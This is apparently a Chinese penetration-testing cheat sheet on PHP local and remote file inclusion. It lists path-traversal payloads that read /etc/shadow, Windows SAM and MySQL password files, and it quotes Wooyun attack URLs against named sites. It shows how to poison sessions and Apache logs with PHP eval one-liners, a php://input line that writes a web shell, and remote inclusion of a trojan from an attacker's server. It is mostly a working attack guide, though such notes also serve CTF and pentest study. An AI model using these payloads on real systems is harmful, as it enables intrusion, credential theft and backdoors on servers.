![文件包含漏洞.png](https://cdn.nlark.com/yuque/0/2020/png/1345801/1588493752462-d6c14025-8203-4290-8a73-64f8a28e6142.png#align=left&display=inline&height=2319&originHeight=2319&originWidth=4169&size=951754&status=done&style=none&width=4169)<br />开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这中文件调用的过程一般被称为文件包含。<br /> <br />allow_url_fopen = On（是否允许打开远程文件）<br />allow_url_include = On（默认关闭，是否允许include/require远程文件）该选项为on便是允许 包含URL 对象文件等。<br /> <br />PHP版本<=5.2 可以使用%00进行截断。（能截断的php版本都小于5.3）
<a name="0VPms"></a>
## 漏洞挖掘payload
**Linux：**<br />../../../../../../../../etc/passwd      // 账户信息<br />etc/passwd%00 <br />....//....//etc/passwd<br />/etc/shadow      // 账户密码文件<br />/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件<br />/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置<br />/usr/local/app/php5/lib/php.ini // PHP相关配置<br />/etc/httpd/conf/httpd.conf // Apache配置文件<br />/etc/my.conf // mysql 配置文件<br />/etc/issue<br />/etc/group<br />/etc/hosts<br />/etc/motd<br />/etc/mysql/my.cnf<br />/proc/self/environ<br />/proc/version<br />/proc/cmdline<br />** **<br />**Windows**<br />c:\boot.ini // 查看系统版本<br />c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件<br />c:\windows\repair\sam // 存储Windows系统初次安装的密码<br />c:\ProgramFiles\mysql\my.ini // MySQL配置<br />c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码<br />c:\windows\php.ini // php 配置信息<br />** **<br />**乌云payload**<br />../../../../../../../../../../etc/passwd<br />../../../../../../../../../../home/img/odp/log/access_log<br />./../../../../../../../../etc/passwd%00<br />../../ierp/bin/prop.xml<br />[http://red.xunlei.com/index.php?id=../test.php%00&r=site/news](http://red.xunlei.com/index.php?id=../test.php%2500&r=site/news)<br />[pagename=znjl&url=/WEB-INF/web.xml&errpage=/WEB-INF/web.xml](http://**.**.**.**/LlfxServlet?lmbh=znjl_jbts&pagename=znjl&url=/WEB-INF/web.xml&errpage=/WEB-INF/web.xml)<br />[http://**.**.**.**//index.php?index=a&skin=&dataoptimize_html=/../../../favicon.ico](http://**.**.**.**//index.php?index=a&skin=&dataoptimize_html=/../../../favicon.ico)<br />..%2FWEB-INF%2Fweb.xml<br />../WEB-INF/mvc-servlet.xml
<a name="Mfkua"></a>
## 本地包含
<a name="pXH6V"></a>
### 包含同目录下的文件
?file=test.txt
<a name="WvvBw"></a>
### 目录遍历
?file=./../../test.txt
<a name="bG6Ke"></a>
### 包含图片马
先上传jpg图片木马，然后本地文件包含，如以下案例：<br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1588493662194-0a2165cf-e521-4585-a8e4-d2dba1bcd543.png#align=left&display=inline&height=336&originHeight=506&originWidth=1124&status=done&style=none&width=746)
<a name="Tysq4"></a>
### Session文件包含
前提：<br />1.seesion存储的位置<br />2.sesion内容可控<br /> <br />Phpinfo中的session.save_path保存的是Session的存储位置。通过phpinfo的信息获取session.save_path为/var/lib/php。<br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1588493662313-32314b25-5c81-4b57-8ae1-6c10e3c3245d.png#align=left&display=inline&height=115&originHeight=115&originWidth=554&status=done&style=none&width=554)<br />假设漏洞代码如下所示：<br /><?php<br />     session_start();<br />     $ctfs= $_GET['ctfs'];<br />     $_SESSION['username']=$ctfs;<br />?><br />可以利用GET型ctfs参数将而已代码写入Session文件中，然后再利用文件包含漏洞包含此Session文件,向系统中传入恶意代[http://127.0.0.1/test.php?ctfs=<?php](http://127.0.0.1/test.php?ctfs=%3c?php) phpinfo(); ?>  将php语句写入session中<br />[http://127.0.0.1/test.php?filename=C:\phpStudy\PHPTutorial\tmp\tmp\sess_c3b4faa1f3b28c602c862bdf366fd92c](http://127.0.0.1/test.php?filename=C:\phpStudy\PHPTutorial\tmp\tmp\sess_c3b4faa1f3b28c602c862bdf366fd92c) **包含session文件session文件名(真正的文件名默认都有个前缀就是sess_)**<br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1588493662481-432d2b3a-0a28-4284-92eb-909b6cf099fe.png#align=left&display=inline&height=114&originHeight=114&originWidth=554&status=done&style=none&width=554)<br /> 
<a name="mPupu"></a>
### 本地包含配合apache日志拿shell
apache日志分为access.log与error.log，当我们请求一个url地址时，便会记录在access.log中，但如果访问一个不存在的页面，便会将这个页面写入access.log中。如访问URL:[_http://www.xxx.com/_](http://www.xxx.com/)_<?php eval([$_POST]);?>_则会将一句话写入到access.log中，但是一般来说，写入到access.log文件中的一句话是被编码的，所以需要抓包绕过，而且利用此漏洞需要知道access.log的地址，不然便没有。<br /> 
<a name="hMRRS"></a>
### 利用/proc/self/environ进行包含
![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1588493662619-fc20895b-9900-47cc-9835-163e52ac3053.png#align=left&display=inline&height=470&originHeight=503&originWidth=798&status=done&style=none&width=746)<br /> <br /> <br /> 
<a name="Rsq0a"></a>
### php://input（写入木马）
前提：php配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP < 5.3.0）<br /> <br /><?PHP fputs(fopen('shell.php','w'),'<?php @eval($_POST[cmd])?>');?><br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1588493662735-edf90116-8def-4aa7-b516-53d088943314.png#align=left&display=inline&height=182&originHeight=182&originWidth=546&status=done&style=none&width=546)<br /> 
<a name="RTP74"></a>
### zip://, bzip2://, zlib://
协议在双off的情况下也可以正常使用；<br />allow_url_fopen ：off/on<br />allow_url_include：off/on<br />**思路：（也是上传之后包含文件）**<br />先将要执行的PHP代码写好文件名为phpcode.txt，将phpcode.txt进行zip压缩,压缩文件名为file.zip,如果可以上传zip文件便直接上传，若不能便将file.zip重命名为file.jpg后在上传，其他几种压缩格式也可以这样操作。<br />bzip2://协议<br />使用方法：<br />compress.bzip2://file.bz2<br />测试现象：<br />[http://127.0.0.1/cmd.php?file=compress.bzip2://D:/soft/phpStudy/WWW/file.jpg](http://127.0.0.1/cmd.php?file=compress.bzip2://D:/soft/phpStudy/WWW/file.jpg)<br />or<br />[http://127.0.0.1/cmd.php?file=compress.bzip2://./file.jpg](http://127.0.0.1/cmd.php?file=compress.bzip2://./file.jpg)<br />zlib://协议<br />使用方法：<br />compress.zlib://file.gz<br /> <br />测试现象：<br />[http://127.0.0.1/cmd.php?file=compress.zlib://D:/soft/phpStudy/WWW/file.jpg](http://127.0.0.1/cmd.php?file=compress.zlib://D:/soft/phpStudy/WWW/file.jpg)<br />or<br />[http://127.0.0.1/cmd.php?file=compress.zlib://./file.jpg](http://127.0.0.1/cmd.php?file=compress.zlib://./file.jpg)<br /> 
<a name="Bu3MX"></a>
## 远程文件包含
远程文件包含的时候一句话木马后缀不能为php。<br />需要开启allow_url_include = On<br />[http://127.0.0.1/test.php?filename=http://公网IP/muma.txt](http://127.0.0.1/test.php?filename=http://公网IP/muma.txt)<br /> 
<a name="E2W6r"></a>
## 伪协议
Ctf常用<br />?action=php://filter/read=convert.base64-encode/resource=login.php  (Base64加密)<br /> 
<a name="Krhuh"></a>
## 好文章
[https://mp.weixin.qq.com/s/IT6bbaG7zBbnrvcNPYr1_w](https://mp.weixin.qq.com/s/IT6bbaG7zBbnrvcNPYr1_w)
